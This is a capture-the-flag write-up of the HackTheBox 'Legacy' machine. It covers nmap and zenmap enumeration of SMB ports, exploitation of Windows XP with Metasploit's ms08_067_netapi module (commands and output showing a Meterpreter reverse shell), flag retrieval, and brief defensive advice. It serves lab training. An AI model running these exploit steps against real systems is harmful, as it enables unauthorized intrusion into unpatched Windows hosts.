---
layout: page
title: HackTheBox Legacy
---

Legacy is a challenge that is fairly simplistic, uncomplicated challenge. Doing this challenge highlights the security vulnerabilities that are associated with SMB on Windows. To do this challenge, the skills required isn’t too high, one just needs to know how to enumerate the box/network and basic windows knowledge. Doing this challenge will develop skills such as identifying services that are vulnerable to attacks, how to carry out said attacks, and any tools used.

### Enumeration - two ways

There a couple options/tools one can use for enumeration. One of which is zenmap (basically nmap GUI). One can open the zenmap by simply typing ```zenmap``` in the console (in Kali Linux). When zenmap is opened, typing in the machine's ip ```10.10.10.4``` and using the ```intenese scan``` will yield the result:

![legacy](https://user-images.githubusercontent.com/41026969/52360132-4871ca80-2a09-11e9-8881-d19973e720a4.png)
![legacy](https://user-images.githubusercontent.com/41026969/52360714-ae128680-2a0a-11e9-8a3f-6786cef4cde0.png)

Reading the above, we can see that SMB is left open, it is also revealed that the OS is likely to be Windows XP.

Zenmap isn't necessary to enumerate, one can also use ```nmap```. More specifically I like to add the following ```nmap -Pn --script [address]```. When doing so on the target IP, we get the result:

![legacy](https://user-images.githubusercontent.com/41026969/52376078-32770080-2a2f-11e9-8242-3e4ca8fc9254.PNG)

So using one of the scans above, we learn that port 139 and 445 are open. Reading about the ports ([here](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-fora0) and [here](https://docs.microsoft.com/en-us/windows/desktop/fileio/microsoft-smb-protocol-and-cifs-protocol-overviewa0)) we learn that port 139 is used for TCP NetBios connections with a system running Samba (SMB) to facilitate file sharing activities over a connection. Also we learn that port 445  is ```‘SMB over IP’```. Continuing to read about port 445 reveals that SMB can be a vulnerability ```Port 445 is vulnerable and has many insecurities```. 

### Exploiting

Googling exploits for Windows XP SMB exploit we find a module that we can use using metasploit - ```exploit/windows/smb/ms08_067_netapi```. Here's what I did with metasploit:
```
       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > set rhost 10.10.10.4
rhost => 10.10.10.4
msf exploit(windows/smb/ms08_067_netapi) > set rport 445
rport => 445
msf exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on [host IP]
[*] [host IP] - Automatically detecting the target...
[*] [host IP] - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] [host IP] - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] [host IP] - Attempting to trigger the vulnerability...
[*] Sending stage (179779 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened ([host IP] -> 10.10.10.4:1029) at 2019-02-06 18:01:37 -0500
```
Going through command by command, first I set the remote host ```rhost``` to the target IP, then I set the remote port using ```rport``` then using the command ```exploit``` will carry out the exploit. Doing so succesfully will get us a shell in the system (note: remember this is a windows system). 

Looking up for the [file system path](https://www.computerhope.com/issues/ch000928.htm), we see that for Windows XP 2000, we use the path ```c:\documents and settings\(username)\desktop``` to get to a user's desktop to look for flags. I used the commands ```pwd``` and the ```cd ..``` to print the working directory and to change directory (the ```..``` will go to the directory above) to navigate throughout the box. 

Looking around the machine, we find an ```Administration``` account and another account named ```john```. Looking at their desktops we get the root and the user flag!
 
### Post exploitation 
Doing this challenge I learned what port 139 and 445 does and what SMB is and does. Continuing to research these ports, I learned that port 445 is vulnerable as seen from the box. To defend against this attack, using windows firewall to not keep ports (in this case, 139 and 445) open. One can also do security patches and updates for their Windows version to protect against CVEs. 